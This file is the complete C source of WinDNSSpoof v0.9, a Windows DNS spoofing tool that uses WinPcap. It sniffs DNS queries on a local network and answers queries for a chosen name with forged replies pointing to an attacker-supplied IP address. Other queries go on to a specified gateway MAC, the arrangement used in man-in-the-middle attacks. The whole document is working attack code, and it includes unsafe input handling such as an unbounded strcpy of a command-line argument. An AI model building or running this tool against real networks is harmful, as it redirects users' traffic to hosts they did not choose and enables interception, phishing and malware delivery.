/*
 * WinDNSSpoof by Valgasu (valgasu@securiteinfo.com)
 *
 * a simple DNS Spoofer for Windows
 *
 * It requires WinPcap (http://winpcap.polito.it/)
 *
 */

#include <stdio.h>
#include <winsock2.h>
#include "getopt.h"
#include "packet32.h"
#include "ntddndis.h"
#include "winpcap_common.h"
#include "dnsspoof.h"


int main(int argc, char *argv[])
{
  /* getopt */
  extern char  *optarg;
  register int opt;

  /* WinPcap */
  LPADAPTER lpAdapter = 0;
  LPPACKET  lpPacketDNSin;
  LPPACKET  lpPacketDNSout;
  char      buffer[256000];

  /* Packet */  
  unsigned char *packet;
  int           packet_len;

  /* Ethernet header */
  unsigned char	ethersrc[6];
  unsigned char	etherdst[6];
  unsigned char ethergw[6];

  /* IP header */
  unsigned char	ipsrc[4];
  unsigned char	ipdst[4];

  /* UDP header */
  unsigned short int udp_src_port;  
  
  /* DNS */
  unsigned short int dns_id;
  unsigned char      spoofip[4];
  unsigned char      *dns_data;   
  char               *dns_query;
  char               dnsname[255];
  int                datalen;  

  /* Flags */
  int flag_name = 0;
  int flag_ip = 0;
  int flag_verbose = 0;
  int flag_gw = 0;

  /* Others */
  unsigned int        off = 0;		
  struct ether_header *eth;		
  struct bpf_hdr      *hdr;		  
  char	              *buf;		
        

  /* Get options */ 
  while((opt = getopt(argc, argv, "vhn:i:g:")) != EOF) {
    switch(opt) {     
      /* Help */    	
      case 'h' :
        usage(argv[0]);

	    return(EXIT_SUCCESS);
      
	  /* Verbose mode */
      case 'v' :
		flag_verbose = 1;
		break;

      /* Name to spoof */
      case 'n' :
        strcpy(dnsname, optarg);    
        flag_name = 1;
	    break;

      /* Spoofed IP */
      case 'i' :
        if((strlen(optarg) < 7) || (strlen(optarg) > 15)) {
          usage(argv[0]);

          exit(EXIT_FAILURE);
        }
            
        sscanf(optarg, "%d.%d.%d.%d", 
	       &spoofip[0], &spoofip[1], &spoofip[2], 
	       &spoofip[3]);
	               		
        flag_ip = 1;
	    break;

	  /* Gateway or DNS server MAC address for forwarding */
	  case 'g' :
        if (strlen(optarg) != 17) {
          usage(argv[0]);

          exit(EXIT_FAILURE);
        }
        
        sscanf(optarg, "%02X-%02X-%02X-%02X-%02X-%02X", 
	       &ethergw[0], &ethergw[1], &ethergw[2], 
	       &ethergw[3], &ethergw[4], &ethergw[5]);
	               
		flag_gw = 1;
        break;
	}
  }
  
  /* Verify all options */
  if(!((flag_ip == 1)&&(flag_name == 1)&&(flag_gw == 1))) {
    usage(argv[0]);

	return(EXIT_FAILURE);
  }      
  
  /* Open selected adapter */ 
  if(open_adapter(&lpAdapter) == EXIT_FAILURE) {
    return(EXIT_FAILURE);
  }

  /* Print informations */
  printf("\n>> WinDNSSpoof v0.9 by Valgasu (valgasu@securiteinfo.com) <<\n\n");

  if(flag_verbose == 1) {
    printf("+ DNS server : %02X-%02X-%02X-%02X-%02X-%02X\n",
		   ethergw[0], ethergw[1], ethergw[2], 
		   ethergw[3], ethergw[4], ethergw[5]);
    printf("+ DNS query  : %s\n", dnsname);
    printf("+ IP reply   : %d.%d.%d.%d\n\n", 
	       spoofip[0], spoofip[1], spoofip[2], 
	       spoofip[3]);	
  }
  else {
    printf("+ listening [%s] DNS query\n\n", dnsname);
  }

  /* Allocate PACKET structure for DNS response packet */
  if((lpPacketDNSout = PacketAllocatePacket()) == NULL) {
    fprintf(stderr, "\nError : failed to allocate the LPPACKET structure.\n");

    return(EXIT_FAILURE);
  }  
  
  /* Set number of DNS packets to send */
  if(PacketSetNumWrites(lpAdapter, 1) == FALSE) {
    fprintf(stderr, "\nWarning : unable to send more than one packet in a single write.\n");
  }


  /* Set hardware filter to directed mode */
  if(PacketSetHwFilter(lpAdapter, NDIS_PACKET_TYPE_DIRECTED) == FALSE) {
    printf("\nWarning: unable to set directed mode.\n");	
  }

  /* Set a 1 Mo buffer in the driver */
  if(PacketSetBuff(lpAdapter, 1048576) == FALSE){
    printf("\nError: unable to set the kernel buffer.\n");

	return(EXIT_FAILURE);
  }

  /* Set no read timeout i.e. PacketReceivePacket() never returns if no packet arrives */
  if(PacketSetReadTimeout(lpAdapter, 0) == FALSE) {
    printf("\nWarning: unable to set the read timeout.\n");
  }

  
  /* Allocate PACKET structure for incoming DNS packet */
  if((lpPacketDNSin = PacketAllocatePacket()) == NULL) {
    printf("\nError: failed to allocate the LPPACKET structure.\n");	

	return(EXIT_FAILURE);
  }
  
  /* Init incomimg UDP packet */
  PacketInitPacket(lpPacketDNSin, (char*)buffer, 256000);


  /* Main loop */
  while(1) {
    /* Capture the packets */
	if(PacketReceivePacket(lpAdapter, lpPacketDNSin, TRUE) == FALSE) {
	  printf("\nError: PacketReceivePacket failed.\n");      
	  PacketFreePacket(lpPacketDNSin);
	  close_adapter(lpAdapter);

	  return(EXIT_FAILURE);
	}

	/* Check if it is a DNS packet */
	if(read_dns(lpPacketDNSin, etherdst, ethersrc, ipsrc, ipdst, &udp_src_port, &dns_id, 
		        &dns_data, dnsname, &datalen, flag_verbose) == EXIT_SUCCESS) {	

      dns_query = (char *)malloc(sizeof(char) * (datalen - 4));
	  dns_extract_query(dns_query, dns_data);

	  /* Print incoming UDP packet informations */
	  if(flag_verbose == 1) {
	    printf("\n+ ETH - Source address : %02X-%02X-%02X-%02X-%02X-%02X\n", 
	            ethersrc[0], ethersrc[1], ethersrc[2], 
	            ethersrc[3], ethersrc[4], ethersrc[5]);	
 
  	    printf("+ IP  - Source address : %d.%d.%d.%d\n", 
	            ipsrc[0], ipsrc[1], ipsrc[2], ipsrc[3]);
          		  
	    printf("+ UDP - Source port: %d\n", udp_src_port);		  		  	    
		printf("+ DNS - ID : %d\n", dns_id);
        printf("+ DNS - Query : %s\n", dns_query);
        printf("\n");
	  }
	  else {
        printf("+ DNS query [%s] from %d.%d.%d.%d\n", dns_query, 
	            ipsrc[0], ipsrc[1], ipsrc[2], ipsrc[3]);
	  }					  

	  /* Check if this DNS query must be spoof */
	  if((strcmp(dns_query, dnsname)) != 0) {				  

        /* Init buffer with packet data */
		buf = (char *)lpPacketDNSin->Buffer;		  					

		/* Read packet */	
		hdr = (struct bpf_hdr *)buf;				
		off += hdr->bh_hdrlen;	  
		packet_len = hdr->bh_caplen;		
        packet = (unsigned char *)malloc(packet_len);		
		memcpy(packet, buf + off, packet_len);
		
		/* Modify the destination MAC address for forwarding */
		eth = (struct ether_header *)packet;
		memcpy(eth->eth_dst_addr, ethergw, 6);		
	  }
	  else {
        packet_len = ETH_HDRSIZE + IP_HDRSIZE + UDP_HDRSIZE + DNS_HDRSIZE + datalen + 16;
        packet = (unsigned char *)malloc(packet_len);

		/* Build the spoofed DNS packet */
        dns_build(packet, ethersrc, etherdst, ipsrc, ipdst, udp_src_port, dns_id, spoofip, 
			      dns_data, datalen);   
		
		if(flag_verbose == 1) {
          printf("\n+ ETH - Destination address : %02X-%02X-%02X-%02X-%02X-%02X\n", 
	              ethersrc[0], ethersrc[1], ethersrc[2], 
	              ethersrc[3], ethersrc[4], ethersrc[5]);	
 
  	      printf("+ IP  - Destination address : %d.%d.%d.%d\n", 
	              ipsrc[0], ipsrc[1], ipsrc[2], ipsrc[3]);
          		  
	      printf("+ UDP - Destination port: %d\n", udp_src_port);		  		  	    
		  printf("+ DNS - ID : %d\n", dns_id);
          printf("+ DNS - Response : %d.%d.%d.%d\n\n", 
	              spoofip[0], spoofip[1], spoofip[2], spoofip[3]);	
          printf("\n");
		}
		else{
          printf("+ DNS response [%d.%d.%d.%d] to %d.%d.%d.%d\n", 
	              spoofip[0], spoofip[1], spoofip[2], spoofip[3],
				  ipsrc[0], ipsrc[1], ipsrc[2], ipsrc[3]);
		}
	  }
	  	  
      PacketInitPacket(lpPacketDNSout, packet, packet_len);

	  /* Send the packet */
      if(PacketSendPacket(lpAdapter, lpPacketDNSout, TRUE) == FALSE) {
        fprintf(stderr, "\nError : unable to send the packets.\n");	                
        PacketFreePacket(lpPacketDNSin);
		PacketFreePacket(lpPacketDNSout);

		return(EXIT_FAILURE);
	  }

	  /* Free buffer */
	  free(packet);
	  free(dns_data);
	  free(dns_query);	  
	}	
  }

  return(EXIT_SUCCESS);
}


int read_dns(LPPACKET lpPacket, unsigned char *etherdst, unsigned char *ethersrc,
			 unsigned char *ipsrc, unsigned char *ipdst,
			 unsigned short int *udp_src_port, unsigned short int *dns_id, 
			 unsigned char **dns_data, char *dnsname, int *datalen, int verbose)
{
  /* Variables */  
  unsigned int       off = 0;
  unsigned int       tlen, tlen1;      
  struct bpf_hdr     *hdr;		  
  char	             *buf;
  char	             *pChar;
  
  /* Headers */
  struct ether_header *eth;
  struct ip_header    *ip;
  struct udp_header   *udp;
  struct dns_header   *dns;
  char                *dns_dat;


  /* Init buffer with packet data */
  buf = (char *)lpPacket->Buffer;		
	
  /* Read packet */	
  hdr = (struct bpf_hdr *)(buf + off);
  tlen1 = hdr->bh_datalen;
  tlen = hdr->bh_caplen;
  off += hdr->bh_hdrlen;	  
  pChar = (char*)(buf + off);	
  off = Packet_WORDALIGN(off + tlen);

  /* Init headers */
  eth = (struct ether_header *)pChar;
  ip = (struct ip_header *)(pChar + ETH_HDRSIZE);
  udp = (struct udp_header *)(pChar + ETH_HDRSIZE + IP_HDRSIZE);
  dns = (struct dns_header *)(pChar + ETH_HDRSIZE + IP_HDRSIZE + UDP_HDRSIZE);
  dns_dat = (char *)(pChar + ETH_HDRSIZE + IP_HDRSIZE + UDP_HDRSIZE + DNS_HDRSIZE);

  if(eth->eth_type == htons(ETH_TYPE_IP)) {	
    if(ip->ip_p == IP_PRO_UDP) {	  
      if(udp->udp_dst_port == htons(53)) {
        if(dns->dns_qr == 0) {
		  /* Read DNS data */
	      *dns_data = (unsigned char *)malloc(sizeof(unsigned char) * (tlen - (ETH_HDRSIZE + IP_HDRSIZE + UDP_HDRSIZE + DNS_HDRSIZE)));		
	      memcpy(*dns_data, dns_dat, tlen - (ETH_HDRSIZE + IP_HDRSIZE + UDP_HDRSIZE + DNS_HDRSIZE));				
	      *datalen = (tlen - (ETH_HDRSIZE + IP_HDRSIZE + UDP_HDRSIZE + DNS_HDRSIZE));		

		  /* Read Ethernet destination address */
          memcpy(etherdst, eth->eth_dst_addr, 6);		

  	      /* Read Ethernet source address */
          memcpy(ethersrc, eth->eth_src_addr, 6);		

	      /* Read IP source address */
	      memcpy(ipsrc, ip->ip_src, 4);
	
          /* Read IP destination address  */
	      memcpy(ipdst, ip->ip_dst, 4);
	
		  /* Read UDP source port */
	      *udp_src_port = htons(udp->udp_src_port);		  	  	
	  
		  /* Read DNS identification */
		  *dns_id = htons(dns->dns_id);
		  
		  return(EXIT_SUCCESS);
		}                  
	  }
	}
  }

  return(EXIT_FAILURE);
} 


void usage(char *name) 
{
  printf("\n>> WinDNSSpoof v0.9 by Valgasu (valgasu@securiteinfo.com) <<\n");

  printf("\nusage: %s [options]\n\n", name);	    
  printf("options:\n");
  printf("  -n [name] name to spoof\n");
  printf("  -g [mac]  gateway or DNS server ethernet address\n");
  printf("  -i [ip]   ip address\n");
  printf("  -v        verbose\n");    
  printf("  -h        help\n");    
}


void dns_extract_query(char *dns_query, unsigned char *dns_data) {
  /* Variables */
  int i;
  int j=0;
  int len;
  int cumul = 0;


  while(1) {
    len = int(dns_data[j]);	
	if(len == 0) {
		break;
	}    

    for(i = 0; i < len; i++) {
      sprintf(dns_query + cumul, "%c", dns_data[j + 1 + i]);
	  cumul++;
	}

	j = j + len + 1;        	

    sprintf(dns_query + cumul,".");
    cumul++;	
  }

  sprintf(dns_query + cumul - 1, "\0");  
}


void dns_build(unsigned char *packet, unsigned char *dst_etheraddr, 
			   unsigned char *src_etheraddr, unsigned char *ip_dst_addr, 
			   unsigned char *ip_src_addr, unsigned short int udp_dst_port, 
			   unsigned short int dns_id, unsigned char *spoofip, 
			   unsigned char *dns_data, int datalen)
{
  /* Headers */
  struct ether_header *eth_hd;
  struct ip_header    *ip_hd;
  struct udp_header   *udp_hd; 
  struct dns_header   *dns_hd;
  unsigned char	      *dns_dat;   

  /* Others */
  int                 sum = 0;
  

  /* Set headers size */
  eth_hd = (struct ether_header *)packet;
  ip_hd = (struct ip_header *)(packet + ETH_HDRSIZE);
  udp_hd = (struct udp_header *)(packet + ETH_HDRSIZE + IP_HDRSIZE);
  dns_hd = (struct dns_header *)(packet + ETH_HDRSIZE + IP_HDRSIZE + UDP_HDRSIZE);
  dns_dat = (unsigned char *)(packet + ETH_HDRSIZE + IP_HDRSIZE + UDP_HDRSIZE + DNS_HDRSIZE);

  /* Set ethernet header */
  memcpy(&(eth_hd->eth_dst_addr), dst_etheraddr, ETH_ADD_LEN);  
  memcpy(&(eth_hd->eth_src_addr), src_etheraddr, ETH_ADD_LEN);
  eth_hd->eth_type = htons(ETH_TYPE_IP);  

  /* Set ip header  */
  ip_hd->ip_v   = 4;
  ip_hd->ip_hl  = 5;
  ip_hd->ip_tos = 0;     
  ip_hd->ip_id  = htons(58883);      
  ip_hd->ip_flags_off = htons(0x4000); 
  ip_hd->ip_ttl = 128;
  ip_hd->ip_p   = IP_PRO_UDP;  
  ip_hd->ip_sum = 0;               

  memcpy(&(ip_hd->ip_src), ip_src_addr, 4);
  memcpy(&(ip_hd->ip_dst), ip_dst_addr, 4);      

  /* Set udp header */
  udp_hd->udp_src_port = htons(53);
  udp_hd->udp_dst_port = htons(udp_dst_port);
  udp_hd->udp_sum = 0;

  /* Set dns header */
  dns_hd->dns_id = htons(dns_id);
  dns_hd->dns_rd = 1;
  dns_hd->dns_tc = 0;
  dns_hd->dns_aa = 0;
  dns_hd->dns_op = 0;
  dns_hd->dns_qr = 1;
  dns_hd->dns_rc = 0;
  dns_hd->dns_z = 0;
  dns_hd->dns_ra = 1;
  dns_hd->dns_qdc = htons(1);
  dns_hd->dns_anc = htons(1);
  dns_hd->dns_nsc = htons(0);
  dns_hd->dns_arc = htons(0);

  /* Set dns data */  
  memcpy(dns_dat, dns_data, datalen);  
  *((unsigned short int *)(dns_dat + datalen)) = htons(0xC00C);
  *((unsigned short int *)(dns_dat + datalen + 2)) = htons(1);
  *((unsigned short int *)(dns_dat + datalen + 4)) = htons(1);
  *((unsigned long *)(dns_dat + datalen + 6)) = htonl(86400);
  *((unsigned short int *)(dns_dat + datalen + 10)) = htons(4);
  memcpy(dns_dat + datalen + 12, spoofip, 4);
  
  /* Set ip total length */
  ip_hd->ip_len = htons(IP_HDRSIZE + UDP_HDRSIZE + DNS_HDRSIZE + datalen + 16);     
  udp_hd->udp_len = htons(UDP_HDRSIZE + DNS_HDRSIZE + datalen + 16);  

  /* Checksum UDP */  
  sum = libnet_in_cksum((u_short *)&ip_hd->ip_src, 8);
  sum += ntohs(IP_PRO_UDP + 8 + DNS_HDRSIZE + datalen + 16);
  sum += libnet_in_cksum((u_short *)udp_hd, 8 + DNS_HDRSIZE + datalen + 16);
  udp_hd->udp_sum = LIBNET_CKSUM_CARRY(sum);  

  /* Checksum IP */
  sum = libnet_in_cksum((u_short *)ip_hd, IP_HDRSIZE);
  ip_hd->ip_sum = LIBNET_CKSUM_CARRY(sum);
}


int libnet_in_cksum(u_short *addr, int len)
{
  u_short ans;
  u_short *w;
  int     sum;
  int     nleft;
  
  sum = 0;
  ans = 0;
  nleft = len;
  w = addr;

  while(nleft > 1) {
    sum += *w++;
    nleft -= 2;
  }

  if(nleft == 1) {
    *(u_char *)(&ans) = *(u_char *)w;
    sum += ans;
  }

  return(sum);
}
